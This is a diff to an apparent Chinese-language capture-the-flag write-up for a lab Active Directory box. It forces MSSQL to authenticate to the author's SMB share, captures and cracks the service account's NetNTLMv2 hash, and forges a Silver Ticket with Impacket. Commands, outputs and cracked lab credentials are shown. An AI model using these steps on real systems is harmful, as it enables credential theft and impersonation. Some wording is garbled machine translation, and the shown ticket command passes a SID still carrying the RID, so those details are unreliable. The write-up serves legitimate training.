@@ -205,4 +205,224 @@ SIGNED\Guest
 ```
 #### SUSER_SNAME 函数作用把 SID（二进制）转换成“用户名”
 #### 域：SIGNED 用户：Guest | SID 枚举 / 用户识别（User Enumeration via SID）
-#### 幸好，netexec它提供了一个--rid-brute可以删除用户的选项：
+#### netexec它提供了一个--rid-brute可以删除用户的选项：是不行的，
+```
+[★]$ netexec mssql 10.129.242.173 -u scott -p 'Sm230#C5NatH' --local-auth -M mssql_priv
+MSSQL       10.129.242.173  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
+MSSQL       10.129.242.173  1433   DC01             [+] DC01\scott:Sm230#C5NatH
+```
+#### 没有发现任何“值得报告的权限”
+
+<details>
+<summary>常见 MSSQL 模块</summary>
+
+```
+[★]$ netexec mssql -L
+LOW PRIVILEGE MODULES
+[*] mssql_priv                Enumerate and exploit MSSQL privileges
+
+HIGH PRIVILEGE MODULES (requires admin privs)
+[*] empire_exec               Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
+[*] met_inject                Downloads the Meterpreter stager and injects it into memory
+[*] nanodump                  Get lsass dump using nanodump and parse the result with pypykatz
+[*] test_connection           Pings a host
+[*] web_delivery              Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module
+```
+</details>
+
+#### 以访客身份登录后，首先要检查两件事：如果我可以冒充我们的链接，我就可以跳转到……
+```
+enum_links --> For links
+
+enum_impersonate --> For if we can impersonate another user with privileges
+```
+### 以 mssqlsvc 身份进行身份验证 | 强制哈希 
+#### 打算xp_dirtree尝试列出我控制的 SMB 共享中的一个目录。这将导致 MSSQL 尝试对我的共享进行身份验证（使用 MSSQL 运行所用的服务帐户），这样我就可以捕获 NetNTLMv2 质询/响应（哈希值）并尝试破解它。我将启动Responder：
+https://github.com/lgandx/Responder
+```
+//系统自带的responder
+ [★]$ sudo responder -I tun0
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.3.0
+```
+#### 现在我将尝试列出主机上 SMB 共享中的目录：
+```
+SQL (scott  guest@master)> xp_dirtree \\10.10.15.139\share
+subdirectory   depth   file   
+------------   -----   ----   
+SQL (scott  guest@master)> 
+```
+#### Responder 中有一个哈希值：
+```
+[SMB] NTLMv2-SSP Client   : 10.129.242.173
+[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
+[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:2402d805c99ee0d0:660DF534BDAF0B295B10E0F94822666C:010100000000000080B930D510B8DC01D60656902490FD1A0000000002000800570033004100510001001E00570049004E002D0050004500360048004500500045004C0035004100360004003400570049004E002D0050004500360048004500500045004C003500410036002E0057003300410051002E004C004F00430041004C000300140057003300410051002E004C004F00430041004C000500140057003300410051002E004C004F00430041004C000700080080B930D510B8DC010600040002000000080030003000000000000000000000000030000074691A570B31EF9829B32DC4F245F376ED000D0ABA9999EC90CFF44E644C812C0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100330039000000000000000000
+```
+#### 破解 NetNTLMv2
+```
+[★]$ cp /usr/share/wordlists/rockyou.txt.gz .
+[★]$ gunzip rockyou.txt.gz
+[★]$ hashcat mssqlsvc.hash rockyou.txt
+
+MSSQLSVC::SIGNED:2402d805c99ee0d0:660df534bdaf0b295b10e0f94822666c:010100000000000080b930d510b8dc01d60656902490fd1a0000000002000800570033004100510001001e00570049004e002d0050004500360048004500500045004c0035004100360004003400570049004e002d0050004500360048004500500045004c003500410036002e0057003300410051002e004c004f00430041004c000300140057003300410051002e004c004f00430041004c000500140057003300410051002e004c004f00430041004c000700080080b930d510b8dc010600040002000000080030003000000000000000000000000030000074691a570b31ef9829b32dc4f245f376ed000d0aba9999ec90cff44e644c812c0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310035002e003100330039000000000000000000:purPLE9795!@
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 5600 (NetNTLMv2)
+```
+#### purPLE9795!@
+#### 此密码可用于非本地登录 MSSQL：
+```
+[★]$ netexec mssql DC01.signed.htb -u mssqlsvc -p 'purPLE9795!@' --local-auth
+MSSQL       10.129.242.173  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
+MSSQL       10.129.242.173  1433   DC01             [-] DC01\mssqlsvc:purPLE9795!@ (Login failed for user 'mssqlsvc'. Please try again with or without '--local-auth')
+[★]$ netexec mssql DC01.signed.htb -u mssqlsvc -p 'purPLE9795!@' 
+MSSQL       10.129.242.173  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
+MSSQL       10.129.242.173  1433   DC01             [+] SIGNED.HTB\mssqlsvc:purPLE9795!@
+```
+### Shell 作为 MSSQL | 枚举Enumeration
+#### mssqlclient.py这次我可以-windows-auth使用 Windows 集成身份验证，通过域帐户连接：
+```
+[★]$ mssqlclient.py mssqlsvc:'purPLE9795!@'@DC01.signed.htb -windows-auth
+Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC01): Line 1: Changed database context to 'master'.
+[*] INFO(DC01): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
+[!] Press help for extra shell commands
+SQL (SIGNED\mssqlsvc  guest@master)> 
+```
+#### 该账户仍显示为访客权限。此账户并非管理员账户
+```
+SQL (SIGNED\mssqlsvc  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
+    
+-   
+0   
+
+```
+#### 这里存在一些冒充行为：
+```
+SQL (SIGNED\mssqlsvc  guest@master)> enum_impersonate
+execute as   database   permission_name   state_desc   grantee    grantor                        
+----------   --------   ---------------   ----------   --------   ----------------------------   
+b'USER'      msdb       IMPERSONATE       GRANT        dc_admin   MS_DataCollectorInternalUser   
+```
+#### dc_admin 已被授予对 msdb 数据库中 MS_DataCollectorInternalUser 用户的 IMPERSONATE 权限。MS_DataCollectorInternalUser 是 msdb 中的一个内置高权限帐户。问题在于 dc_admin 并不存在于 msdb 数据库中。
+```
+SQL (SIGNED\mssqlsvc  guest@master)> enum_logins
+name                                type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   
+---------------------------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   
+sa                                  SQL_LOGIN                 0          1               0             0            0              0           0           0           0   
+
+##MS_PolicyEventProcessingLogin##   SQL_LOGIN                 1          0               0             0            0              0           0           0           0   
+
+##MS_PolicyTsqlExecutionLogin##     SQL_LOGIN                 1          0               0             0            0              0           0           0           0   
+
+SIGNED\IT                           WINDOWS_GROUP             0          1               0             0            0              0           0           0           0   
+
+NT SERVICE\SQLWriter                WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   
+
+NT SERVICE\Winmgmt                  WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   
+
+NT SERVICE\MSSQLSERVER              WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   
+
+NT AUTHORITY\SYSTEM                 WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0   
+
+NT SERVICE\SQLSERVERAGENT           WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   
+
+NT SERVICE\SQLTELEMETRY             WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0   
+
+scott                               SQL_LOGIN                 0          0               0             0            0              0           0           0           0   
+
+SIGNED\Domain Users                 WINDOWS_GROUP             0          0               0             0            0              0           0           0           0   
+
+SQL (SIGNED\mssqlsvc  guest@master)> 
+
+```
+#### 至少目前来看，这算是条死路。不过，enum_logins输出结果显示登录用户比 Scott 能看到的要多。除了 sa 之外，还有五个用户拥有 sysadmin 权限，以及一个名为 SIGNED\IT 的用户组
+### Silver Ticket 银票
+#### 银票证是使用服务帐户的 NTLM 哈希值伪造的 Kerberos 服务票证 (TGS)。与金票证（使用 krbtgt 哈希值伪造 TGT）不同，银票证针对特定服务。在本例中，由于我拥有 mssqlsvc 帐户的 NTLM 哈希值（或者原始密码，这使得计算 NTLM 哈希值变得非常简单），因此我可以为 MSSQL 服务生成服务票证 (TGS)
+#### TGS 作为 mssqlsvc
+#### 首先，我将证明我可以伪造一个我认识的用户 mssqlsvc 的工单。要创建工单，我需要：服务帐户密码的 NTLM 哈希值 ｜ 域 SID
+#### 为了获取 NTLM 密码，我将使用 Python 和明文密码：
+```
+[★]$ python3 -c 'import hashlib; print(hashlib.new("md4", "purPLE9795!@".encode("utf-16le")).hexdigest())'
+ef699384c3285c54128a3ee1ddb1a0cc
+```
+#### 要获取域名 SID，我将从数据库中获取一个 SID：
+```
+SQL (SIGNED\mssqlsvc  guest@master)> SELECT SUSER_SID('SIGNED\Domain Users');
+                                                              
+-----------------------------------------------------------   
+b'0105000000000005150000005b7bb0f398aa2245ad4a1ca401020000'
+```
+#### Python 可以使用Impacket提供的工具来实现这一点： 把二进制 SID 转换成标准格式 ｜ 5 = NT Authority 表示这是 Windows / AD 体系
+```
+[★]$ python3
+Python 3.11.2 (main, Apr 28 2025, 14:11:48) [GCC 12.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> 
+>>> from impacket.dcerpc.v5.dtypes import SID
+>>> SID(bytes.fromhex('0105000000000005150000005b7bb0f398aa2245ad4a1ca401020000')).formatCanonical()
+'S-1-5-21-4088429403-1159899800-2753317549-513'
+>>> exit()
+```
+#### 原始 SID 是一个采用小端字节序的二进制结构。以下是解析方法：
+```
+字节				场地					价值
+01				修订					1
+05				子机构数量			5
+000000000005	标识符授权			5（NT 管理局）
+15000000		子授权 1	0x00000015 = 21
+5b7bb0f3		子授权 2	0xf3b07b5b = 4088429403
+98aa2245		子授权 3	0x4522aa98 = 1159899800
+ad4a1ca4		子授权 4	0xa41c4aad = 2753317549
+01020000		子授权 5	0x00000201 = 513（域用户 RID）
+```
+#### 将所有这些组合在一起，就得到了 S-1-5-21-4088429403-1159899800-2753317549-513，SIGNED 域的 “Domain Users” 组
+#### 域 SID 将是去掉末尾的 RID：S-1-5-21-4088429403-1159899800-2753317549
+#### 把这些信息组合起来就成了一张车票：
+```
+[★]$ ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549-513 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 mssqlsvc
+Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for signed.htb/mssqlsvc
+[*] 	PAC_LOGON_INFO
+[*] 	PAC_CLIENT_INFO_TYPE
+[*] 	EncTicketPart
+[*] 	EncTGSRepPart
+[*] Signing/Encrypting final ticket
+[*] 	PAC_SERVER_CHECKSUM
+[*] 	PAC_PRIVSVR_CHECKSUM
+[*] 	EncTicketPart
+[*] 	EncTGSRepPart
+[*] Saving ticket in mssqlsvc.ccache
+```
+#### 可以用它连接到 MSSQL：
+```
+[★]$ export KRB5CCNAME=mssqlsvc.ccache
+[★]$ klist
+Ticket cache: FILE:mssqlsvc.ccache
+Default principal: mssqlsvc@SIGNED.HTB
+
+Valid starting       Expires              Service principal
+03/20/2026 03:10:17  03/17/2036 03:10:17  MSSQLSvc/DC01.signed.htb:1433@SIGNED.HTB
+	renew until 03/17/2036 03:10:17
+
+[★]$ mssqlclient.py -k -no-pass DC01.SIGNED.HTB
+Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[-] ERROR(DC01): Line 1: Login failed for user 'SIGNED.HTB\mssqlsvc'.
+```
+
